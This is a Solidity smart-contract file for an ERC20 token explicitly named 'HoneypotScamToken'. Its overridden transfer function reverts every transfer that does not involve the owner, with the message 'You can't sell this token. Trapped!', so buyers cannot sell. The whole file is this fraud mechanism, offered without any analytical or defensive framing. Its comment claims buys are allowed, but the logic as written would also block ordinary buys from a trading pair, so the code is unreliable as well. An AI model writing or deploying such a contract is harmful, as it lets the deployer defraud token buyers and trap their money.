// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract HoneypotScamToken is ERC20 {
    address public owner;

    constructor() ERC20("ScamToken", "SCAM") {
        owner = msg.sender;
        _mint(msg.sender, 1_000_000 ether);
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        // Allow only buys and owner transfers
        if (from != owner && to != owner) {
            revert("You can't sell this token. Trapped!");
        }
        super._transfer(from, to, amount);
    }
}
